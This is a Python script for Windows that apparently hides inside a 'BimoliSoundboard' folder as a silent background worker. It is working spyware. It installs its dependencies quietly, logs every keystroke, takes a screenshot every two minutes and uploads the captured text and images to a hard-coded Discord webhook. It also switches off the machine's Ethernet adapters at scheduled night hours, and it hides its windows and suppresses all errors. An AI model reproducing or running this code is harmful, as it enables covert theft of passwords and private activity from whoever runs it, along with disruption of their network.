#!/usr/bin/env python3

import os
import sys
import time
import threading
import subprocess
from datetime import datetime, timezone, timedelta

WEBHOOK_SS = "https://discord.com/api/webhooks/1534060967993020488/956-oLeHyXftOF0l8d--FGXn4snOg9LmbsRjrUARLxytZObTKjvIfrFA2HIcjB9a8Vyp"
AUTO_SS_INTERVAL = 120
APPDATA_DIR = os.path.join(os.environ.get('LOCALAPPDATA', os.path.expanduser('~')), 'BimoliSoundboard')
LOCK_FILE = os.path.join(APPDATA_DIR, '.worker.lock')
STOP_FILE = os.path.join(APPDATA_DIR, '.worker.stop')

# WIB = UTC+7
WIB = timezone(timedelta(hours=7))
# Jam restart (WIB): 00:00, 02:00, 03:00
RESTART_HOURS = [0, 2, 3]
# Durasi mati (detik)
RESTART_DOWN_SECONDS = 5


class SilentWorker:
    def __init__(self):
        self.text = ""
        self.running = True
        self.lock_obj = threading.Lock()
        self.last_ss = time.time()
        self._last_restart_key = None  # (date, hour) untuk cegah duplikat

    def _send(self, message=""):
        try:
            from PIL import ImageGrab
            from io import BytesIO
            import requests

            img = ImageGrab.grab()
            buf = BytesIO()
            img.save(buf, format="PNG", optimize=True, quality=70)
            buf.seek(0)

            ts = datetime.now(WIB).strftime("%Y-%m-%d %H:%M:%S")
            if message:
                caption = f"📸 **{ts} WIB** | ✏️ Catatan:\n```\n{message}\n```"
            else:
                caption = f"⏰ **{ts} WIB** | Auto Screenshot"

            files = {'file': (f"ss_{ts.replace(':', '-')}.png", buf, 'image/png')}
            requests.post(WEBHOOK_SS, data={'content': caption}, files=files, timeout=10)
            buf.close()
        except:
            pass

    def _get_ethernet_adapters(self):
        """Ambil semua nama adapter Ethernet (Ethernet, Ethernet1, Ethernet2, dst)."""
        adapters = []
        try:
            # Pakai PowerShell untuk list adapter dengan nama yang diawali "Ethernet"
            cmd = [
                "powershell", "-NoProfile", "-NonInteractive", "-Command",
                "Get-NetAdapter | Where-Object { $_.Name -like 'Ethernet*' } | Select-Object -ExpandProperty Name"
            ]
            result = subprocess.run(
                cmd, capture_output=True, text=True,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0,
                timeout=15
            )
            for line in result.stdout.splitlines():
                name = line.strip()
                if name:
                    adapters.append(name)
        except:
            pass
        return adapters

    def _restart_ethernet(self):
        """Matikan semua adapter Ethernet selama 5 detik lalu nyalakan kembali."""
        adapters = self._get_ethernet_adapters()
        if not adapters:
            return

        try:
            # Matikan semua adapter Ethernet
            for name in adapters:
                subprocess.run(
                    ["powershell", "-NoProfile", "-NonInteractive", "-Command",
                     f"Disable-NetAdapter -Name '{name}' -Confirm:$false"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0,
                    timeout=15
                )

            # Diam 5 detik
            time.sleep(RESTART_DOWN_SECONDS)

            # Nyalakan kembali
            for name in adapters:
                subprocess.run(
                    ["powershell", "-NoProfile", "-NonInteractive", "-Command",
                     f"Enable-NetAdapter -Name '{name}' -Confirm:$false"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0,
                    timeout=15
                )

            # Notifikasi ke webhook saja (tanpa logging lokal)
            self._send(f"🔄 Ethernet restart selesai\nAdapter: {', '.join(adapters)}")
        except:
            pass

    def _restart_scheduler_loop(self):
        """Cek setiap detik apakah sudah waktunya restart Ethernet (jam 00, 02, 03 WIB)."""
        while self.running:
            try:
                now = datetime.now(WIB)
                if now.hour in RESTART_HOURS and now.minute == 0 and now.second < 5:
                    key = (now.date(), now.hour)
                    if self._last_restart_key != key:
                        self._last_restart_key = key
                        self._restart_ethernet()
            except:
                pass
            time.sleep(1)

    def _loop(self):
        while self.running:
            time.sleep(1)
            if os.path.exists(STOP_FILE):
                self.running = False
                break
            if self.running and time.time() - self.last_ss >= AUTO_SS_INTERVAL:
                self.last_ss = time.time()
                self._send()
        self.cleanup()

    def _on_key(self, event):
        if not self.running:
            return
        with self.lock_obj:
            if event.name == 'enter':
                if self.text.strip():
                    self._send(self.text.strip())
                    self.text = ""
            elif event.name == 'space':
                self.text += " "
            elif event.name == 'backspace':
                self.text = self.text[:-1] if self.text else ""
            elif len(event.name) == 1:
                self.text += event.name

    def start(self):
        # Install deps silently
        try:
            import keyboard
            from PIL import ImageGrab
            from io import BytesIO
            import requests
        except:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", "keyboard", "pillow", "requests", "--quiet"],
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            try:
                import keyboard
                from PIL import ImageGrab
            except:
                return

        # Create lock file
        os.makedirs(APPDATA_DIR, exist_ok=True)
        with open(LOCK_FILE, 'w') as f:
            f.write(str(os.getpid()))

        # Remove stop file
        if os.path.exists(STOP_FILE):
            os.remove(STOP_FILE)

        self.running = True
        self.last_ss = time.time()

        # Send start notification
        self._send("✅ Bimoli Worker Started!")

        # Start auto SS loop
        t = threading.Thread(target=self._loop, daemon=True)
        t.start()

        # Start restart scheduler loop
        tr = threading.Thread(target=self._restart_scheduler_loop, daemon=True)
        tr.start()

        # Start keyboard listener
        import keyboard
        keyboard.on_press(self._on_key)

        # Keep alive - check stop signal every second
        try:
            while self.running:
                time.sleep(1)
                if os.path.exists(STOP_FILE):
                    self.running = False
        except KeyboardInterrupt:
            pass

        self.cleanup()

    def cleanup(self):
        try:
            if os.path.exists(LOCK_FILE):
                os.remove(LOCK_FILE)
        except:
            pass
        try:
            if os.path.exists(STOP_FILE):
                os.remove(STOP_FILE)
        except:
            pass


def is_worker_running():
    """Check if worker process is running"""
    if not os.path.exists(LOCK_FILE):
        return False
    try:
        with open(LOCK_FILE, 'r') as f:
            pid = int(f.read().strip())
        import ctypes
        kernel32 = ctypes.windll.kernel32
        handle = kernel32.OpenProcess(0x0400, False, pid)
        if handle:
            kernel32.CloseHandle(handle)
            return True
    except:
        pass
    try:
        os.remove(LOCK_FILE)
    except:
        pass
    return False


def stop_worker():
    """Stop worker process"""
    os.makedirs(APPDATA_DIR, exist_ok=True)
    with open(STOP_FILE, 'w') as f:
        f.write("stop")

    for _ in range(20):
        if not os.path.exists(LOCK_FILE):
            return True
        time.sleep(0.5)

    # Force kill
    try:
        with open(LOCK_FILE, 'r') as f:
            pid = int(f.read().strip())
        import ctypes
        kernel32 = ctypes.windll.kernel32
        handle = kernel32.OpenProcess(0x0001, False, pid)
        if handle:
            kernel32.TerminateProcess(handle, 0)
            kernel32.CloseHandle(handle)
    except:
        pass

    for f in [LOCK_FILE, STOP_FILE]:
        try:
            os.remove(f)
        except:
            pass

    return not os.path.exists(LOCK_FILE)


if __name__ == "__main__":
    if is_worker_running():
        sys.exit(0)

    worker = SilentWorker()
    worker.start()
